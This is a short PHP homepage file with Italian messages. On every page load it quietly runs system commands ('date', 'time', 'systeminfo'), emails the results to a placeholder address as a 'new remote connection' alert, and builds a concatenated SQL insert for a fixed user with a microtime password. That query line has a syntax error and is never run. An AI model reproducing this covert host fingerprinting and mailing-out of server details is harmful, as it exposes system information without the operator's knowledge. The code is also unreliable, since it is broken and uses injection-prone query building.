<html>
<head>
<title>Homepage</title>
</head>
<body>
<?php
	include("connect.php");
	if(!$connessione){
	echo "Nessuna connessione.";
	}else{
		echo "Connessione stabilita.";
	
		$data=shell_exec('date /T');
		$ora=shell_exec('time /T');
		$systeminfo=shell_exec('systeminfo /FO LIST');
		
		mail("mia_email","Nuova connessione da remoto",$data."".$ora."".$systeminfo);
		
		$nome="jonsonponzolos";
		$password=microtime();
		
		$query="insert into nometabella(nome, password) values('".$nome."','".$password"');";
	}
?>
</body>
</html>